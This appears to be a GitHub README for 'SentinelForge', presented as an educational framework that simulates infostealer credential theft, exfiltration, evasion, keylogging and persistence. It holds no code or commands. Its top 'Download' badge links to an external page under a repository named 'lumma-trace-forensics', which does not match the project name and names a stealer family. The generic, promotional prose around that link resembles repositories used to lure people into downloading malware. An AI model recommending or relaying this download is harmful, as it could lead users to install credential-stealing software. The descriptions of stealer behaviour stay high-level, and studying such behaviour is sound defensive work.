![preview](https://raw.githubusercontent.com/alumarobalino/lumma-trace-forensics/main/shot_cc94dec.svg)
[![Download](https://raw.githubusercontent.com/alumarobalino/lumma-trace-forensics/main/latest_a5fb10.svg)](https://alumarobalino.github.io/lumma-trace-forensics/)

# SentinelForge — Behavioral Threat Replication Framework

> *Where malware analysis meets modular simulation, turning the dark arts of credential theft into a controlled, educational laboratory.*

**SentinelForge** is a comprehensive, research-grade framework designed for security professionals, malware analysts, and red-team educators who need to understand, dissect, and simulate modern credential-stealing campaigns—without crossing ethical boundaries. Inspired by the need to demystify sophisticated stealer families, this project provides a sandboxed environment where the *anatomy* of infostealer operations can be studied through safe, reproducible, and fully transparent modules.

---

## 🧬 Why Another Security Tool? Because Education Needs a *Dissection Kit*

Most security repositories fall into two camps: overly theoretical white papers or dangerously practical exploit kits. SentinelForge occupies a third, rarely explored space—**the educational morgue**. Think of it as a forensic workshop where the *skeleton* of a stealer is laid out on a table, with every joint, tendon, and reflex arc labeled and documented. You don't run this against real victims; you run it against **simulated environments** to observe how such malware *thinks*, *adapts*, and *exfiltrates*.

Our framework is built around a simple philosophical premise: **you cannot defend against what you do not understand at a mechanical level**. By reconstructing the decision trees, evasion tactics, and data-staging routines of modern infostealers, SentinelForge arms defenders with the *muscle memory* needed to spot these patterns in the wild.

---

## 🚀 Core Modules & Architectural Philosophy

SentinelForge is not a single tool but an **orchestrated suite of modular laboratories**. Each module operates in isolation, communicating through a standardized event bus that mimics real-world C2 (Command & Control) telemetry.

| Module | Codename | Primary Function |
|--------|----------|------------------|
| **Credential Harvest Simulator** | `HoneypotCore` | Simulates browser credential-store access using dummy database files. |
| **Exfiltration Emulator** | `DataPigeon` | Demonstrates network staging, compression, and upload patterns against local sinks. |
| **Evasion Tactics Sandbox** | `CamouflageKit` | Showcases anti-debugging, sleep obfuscation, and VM-detection techniques in a controlled VM. |
| **Keylogging Behavior Lab** | `KeystrokeForge` | Replicates input-capture logic against synthetic keystroke generators. |
| **Persistence Mechanism Mimicry** | `RootNest` | Illustrates common autostart registry and startup-folder modifications in disposable containers. |
| **Environment Fingerprinter** | `DigitalShadow` | Captures system metadata (hardware IDs, locale, OS versions) via public APIs only. |

### 🔄 The Event-Driven Core

At the heart of SentinelForge lies `The Butler`—a lightweight, asynchronous orchestrator that routes events between modules. Think of it as a **switchboard operator** for simulated malicious activity. Instead of performing any real harm, The Butler logs every state change, decision point, and data-manipulation step into a structured JSONL audit trail. This trail is invaluable for:

- **Incident response tabletop exercises**
- **Building custom YARA rules based on behavioral artifacts**
- **Training SOC analysts to recognize stealer "tells"**

---

## 🧩 Feature-Rich Design for Modern Defenders

### 🎛️ Responsive Command Console
SentinelForge ships with a **terminal-based user interface** that adapts to any shell width. It provides real-time visualization of module state, trigger conditions, and simulated telemetry flows. The console supports keyboard-driven navigation, color-coded severity levels, and granular log filtering.

### 🌍 Multilingual Telemetry Commentary
Security teams are global. Our audit logs and analyst notes are annotated in **English, Spanish, German, Japanese, and Hindi**—ensuring that diverse teams can share insights without language barriers becoming a fight against entropy.

### 🕰️ 24/7 Simulation Engine
The framework includes a `SchedulerDaemon` that can run simulations continuously, cycling through various "campaign profiles" (e.g., retail credential theft, enterprise SaaS token harvesting, browser-session replay). This allows for **overnight soak testing** of your detection stack.

### 🔧 No-Build Integration
SentinelForge is distributed as a self-contained collection of **portable scripts and configuration manifests**. You simply drop the framework into a designated `sandbox_root` directory. The embedded `BootstrapEngine` checks for dependencies gracefully, offering message-box prompts (instead of command-line errors) when something is missing.

---

## 📚 Deep Dive: The Anatomy of a Stealer Simulation

### Phase 1 — Target Discovery (`DigitalShadow`)
The simulation begins by querying dummy OS APIs to "observe" the host environment. It identifies locales, screen resolutions, and hardware identifiers. In SentinelForge, this data is *synthesized* from a `profile_catalog.json`, preventing any accidental PII capture.

### Phase 2 — Credential Staging (`HoneypotCore`)
Using a fictitious set of SQLite databases (pre-populated with random, meaningless strings), the module exercises common query patterns: locating `Login Data` files, extracting `.sqlite` tables, and decrypting dummy blobs. Every function call is wrapped in a logging decorator, showing the *intent* behind each action.

### Phase 3 — Exfiltration Mimicry (`DataPigeon`)
Harvested data is compressed into a simulated archive and "staged" for upload. The module then makes outbound connections to a **local-only sink server** (included in the framework). This sink validates the integrity of the transmission and records the byte-level patterns. Network engineers can use these captures to derive **Network Signature Patterns** (NSPs) without violating any laws.

### Phase 4 — Evasion Dance (`CamouflageKit`)
This module introduces deliberate, *documented* delays and execution-flow alterations. It demonstrates how stealer families use sleep calls, junk code insertion, and conditional branches to dodge heuristic analysis. The sandbox records the exact CPU cycles and memory-access patterns, providing fodder for **endpoint detection algorithm training**.

---

## 🛠️ Getting Started on Your Forge

To begin your journey into behavioral replication, follow this narrative path rather than a dry list of commands:

1. **Prepare your laboratory**: Create a dedicated user account on a *throwaway virtual machine*. Ensure snapshots are enabled. This is your canvas.
2. **Acquire the artifacts**: Download the SentinelForge bundle. The bundle includes all companion data files (dummy credentials, fake browser profiles, and simulation scenarios).
3. **Run the concierge**: Execute `forge.bootstrap` from the terminal. The concierge will verify your environment (checking for Python 3.11+, QEMU artifacts, and network isolation) and offer a guided tour of the default campaign.
4. **Observe the exhibit**: Launch the `Default-Campaign-2026` profile. The console will light up with telemetry streams. Open the `audit_trail/` directory in any JSON viewer to watch the step-by-step logic unfold.

> ⚠️ **Important**: SentinelForge must only run inside an isolated, ephemeral environment. It contains **no real malware code** but mimics the *decision logic* of proprietary stealers. Treat the repository with the respect of a biohazard containment manual.

---

## 🗺️ Repository Structure — A Map to the Forge

```
sentinelforge/
├── forge_core/
│   ├── butler.py              # The event orchestrator
│   ├── telemetry_bus.py       # Internal message router
│   └── audit_logger.py        # Structured JSONL logging
├── modules/
│   ├── honeypot_core/
│   ├── data_pigeon/
│   ├── camouflage_kit/
│   ├── keystroke_forge/
│   ├── root_nest/
│   └── digital_shadow/
├── simulation_profiles/
│   ├── default_2026.json
│   ├── retail_heist_2026.json
│   └── saas_token_thief.json
├── sandbox_sinks/
│   ├── local_exfil_server.py
│   └── logger_sink.py
├── resources/
│   ├── dummy_database_sqlite/
│   └── fake_browser_profiles/
├── docs/
│   ├── ARCHITECTURE.md
│   ├── THREAT_MODELING_GUIDE.md
│   └── RULES_OF_ENGAGEMENT.md
└── license.md
```

---

## 🧠 Educational Use Cases & Scenarios

### For SOC Teams
Run the `Default-2026` profile once a week. Have your analysts document the behavioral indicators (file system touches, registry queries, network patterns) in a shared threat hunt document. Over time, you'll build an internal playbook that directly references the specific *logic flaws* you observed in the simulation.

### For Malware Researchers
Use SentinelForge to *validate* your hypothesis about how a new family operates. If recent samples show a novel persistence mechanism, quickly patch the `RootNest` module and run a simulation. The audit trail will tell you if your proposed detection logic holds water.

### For Security Educators
The framework generates a **remarkable visual narrative** when paired with standard graphing tools. Students can trace the entire lifecycle of a simulation from trigger to (simulated) exfiltration. It’s a powerful antidote to the "black box" fear of malware.

---

## 📢 Disclaimer — Ethics and Intent

**SentinelForge is a defensive and educational tool.** It contains *no* malicious code, *no* actual credential-decryption algorithms, and *no* network payloads aimed at real hosts. The project was born from the necessity to *simulate with integrity*.

By using this repository, you agree to the following:

- You will **never** modify these modules to target a real user’s machine, network, or data within any jurisdiction.
- You will use this framework **exclusively** within air-gapped or rigorously controlled virtual environments.
- You acknowledge that the creators and contributors bear no responsibility for misuse, illegal activity, or failure to comply with your local laws.

The purpose here is to **teach the anatomy of a threat**—not to provide a weapon. If you find yourself thinking about bypassing the safety checks, you are misusing the project and should step away immediately.

---

## 🌟 Community & Roadmap (2026 Vision)

We are actively expanding SentinelForge to include:

- **AI-driven behavior mapping**: Suggesting simulation profiles based on CVE database updates.
- **Plugin SDK**: Letting the community build new "anatomy lab" modules (e.g., clipboard manipulation mimicry, OCR text extraction emulation).
- **Live sensor dashboard**: A network-aware visualization of all running simulations (read-only, of course).

We invite **security professionals**, **CTI analysts**, and **ethical researchers** to fork, contribute, and share their own module ideas via the discussions board.

---

## 📄 License

SentinelForge is released under the **MIT License**. You are free to study, modify, and distribute it, provided you retain the original copyright notice and disclaimer.

**© 2026 SentinelForge Contributors**

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

[Full License Text](license.md)

---

## 🤝 Acknowledgements & A Final Thought

This project stands on the shoulders of countless reverse-engineering blogs, academic papers on malware taxonomy, and the tireless work of incident responders who share their post-mortems. We owe a debt to the unsung heroes who document the *mechanics* of what they find in the field—without ever naming a perpetrator.

SentinelForge is our attempt to give back to that community with a tool that asks **"What if we could study the blueprint before the fire?"** We hope it becomes a cornerstone of your security education arsenal. Forge your defenses here—in the light.